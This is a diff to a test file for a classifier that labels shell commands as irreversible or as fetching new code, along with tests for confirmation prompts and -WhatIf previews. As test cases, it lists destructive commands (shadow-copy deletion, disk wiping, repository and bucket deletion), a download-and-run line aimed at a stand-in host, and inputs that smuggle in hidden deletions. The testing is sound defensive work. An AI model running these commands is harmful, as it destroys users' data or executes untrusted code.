@@ -73,6 +73,33 @@ const TABLE = [
   ['docker volume prune', [I]],
   ['docker image prune -a', [I]],
   ['docker rm web -f', [I]],
+  ['docker rm -f web', [I]],
+  ['docker rmi app:old', [I]],
+  ['docker compose down -v', [I]],
+  ['docker compose down', []],
+  ['Get-ChildItem *.log | ForEach-Object { Remove-Item $_ }', [I]],
+  ['gci | % { rm $_ }', [I]],
+  ['find . -name "*.tmp" -delete', [I]],
+  ['find . -name "*.o" -exec rm {} +', [I]],
+  ['find . -name "*.ts"', []],
+  ['ls *.bak | xargs rm', [I]],
+  ['git checkout -f main', [I]],
+  ['git switch --discard-changes main', [I]],
+  ['git switch main', []],
+  ['aws s3 rm s3://bucket/key', [I]],
+  ['aws s3 ls', []],
+  ['gh repo delete me/old --yes', [I]],
+  ['gh repo view', []],
+  ['wsl --unregister Ubuntu', [I]],
+  ['wsl -l -v', []],
+  ['vssadmin delete shadows /all', [I]],
+  ['cipher /w:C:\\', [I]],
+  ['& ([scriptblock]::Create((irm https://x.test/a.ps1)))', [N]],
+  ['echo hi\rRemove-Item -Recurse C:/x', [I]],
+  ['git commit -m "x; rm -rf y"', []],
+  ['git grep "drop table"', []],
+  ['git commit -m "drop table migration"', []],
+  ['echo "a | rm b"', []],
   ['docker ps', []],
   ['docker run --rm -it alpine sh', []],
   ['docker build -t app .', []],
@@ -81,9 +108,14 @@ const TABLE = [
   ['npm install', []],
   ['npm run build', []],
   ['npm test', []],
-  ['npm exec -- cowsay hi', [N]],
-  ['npx create-react-app my-app', [N]],
-  ['npx prettier --check .', [N]],
+  ['npm exec -- cowsay hi', []],
+  ['npm exec --yes cowsay', [N]],
+  ['npx create-react-app my-app', []],
+  ['npx prettier --check .', []],
+  ['npx tsc --noEmit', []],
+  ['npx -y create-vite my-app', [N]],
+  ['npx create-vite@latest my-app', [N]],
+  ['npx --package=cowsay cowsay hi', [N]],
   ['pnpm dlx degit user/repo', [N]],
   ['pnpm install', []],
   ['yarn dlx create-vite', [N]],
@@ -257,8 +289,8 @@ check('every label at the default sensitivity', visibleRisks(both, 'all').length
 check('only what cannot be undone, when asked for that', visibleRisks(both, 'irreversible').map((r) => r.class).join() === 'irreversible')
 check('none, when turned off', visibleRisks(both, 'off').length === 0)
 check('a second click for anything irreversible', needsSecondClick(classifyCommand('git reset --hard'), false))
-check('but not for the other classes, in an ordinary window', !needsSecondClick(classifyCommand('npx foo'), false))
-check('in the administrator’s window, for anything labelled', needsSecondClick(classifyCommand('npx foo'), true))
+check('but not for the other classes, in an ordinary window', !needsSecondClick(classifyCommand('npx -y foo'), false))
+check('in the administrator’s window, for anything labelled', needsSecondClick(classifyCommand('npx -y foo'), true))
 check('and nothing for nothing', !needsSecondClick([], true))
 check('each risk says why', classifyCommand('git push --force').every((r) => r.why.length > 10))
 check('a paste’s question is told in a sentence', /^Among them is something that deletes files outright/.test(riskSentence(classifyCommand('rm -rf x'))), riskSentence(classifyCommand('rm -rf x')))
@@ -267,7 +299,8 @@ check('and nothing, for nothing', riskSentence([]) === '')
 // --- -WhatIf, only where it cannot run anything for real ------------------------------------------------
 const preview = (c) => whatIfPreview(c)
 check('a lone cmdlet that honours it is previewed', preview('Remove-Item .\\build -Recurse') === 'Remove-Item .\\build -Recurse -WhatIf', String(preview('Remove-Item .\\build -Recurse')))
-check('its alias too', preview('rm .\\x.txt') === 'rm .\\x.txt -WhatIf')
+check('an alias by the cmdlet’s full name, which cmd and bash cannot run', preview('rm .\\x.txt') === 'Remove-Item .\\x.txt -WhatIf', String(preview('rm .\\x.txt')))
+check('with an environment variable', preview('Remove-Item $env:TEMP\\x') === 'Remove-Item $env:TEMP\\x -WhatIf', String(preview('Remove-Item $env:TEMP\\x')))
 check('after readers in a pipeline', preview('Get-ChildItem *.tmp | Remove-Item') === 'Get-ChildItem *.tmp | Remove-Item -WhatIf')
 for (const unsafe of [
   'Remove-Item x; Remove-Item y',
@@ -281,7 +314,19 @@ for (const unsafe of [
   'git reset --hard',
   'npm install | Remove-Item x',
   'Stop-Process -Name node && Remove-Item x',
-  'Remove-Item `\n x'
+  'Remove-Item `\n x',
+  // QA's, each of which ran its deletion for real before the allowlist:
+  "Remove-Item 'x' # tidy up",
+  "Remove-Item (Remove-Item 'x')",
+  "Remove-Item ([IO.File]::Delete('x'))",
+  "Get-Item (Remove-Item 'x') | Remove-Item",
+  "Remove-Item $ExecutionContext.InvokeCommand.InvokeScript('Remove-Item x')",
+  '.\\remove-item.ps1 x',
+  'C:\\x\\get-thing.ps1 | Remove-Item',
+  'Remove-Item a\rRemove-Item b',
+  'Remove-Item "a|b"',
+  "Remove-Item 'unbalanced",
+  'Remove-Item x -wh'
 ]) {
   check(`no preview for ${JSON.stringify(unsafe)}`, preview(unsafe) === null, String(preview(unsafe)))
 }
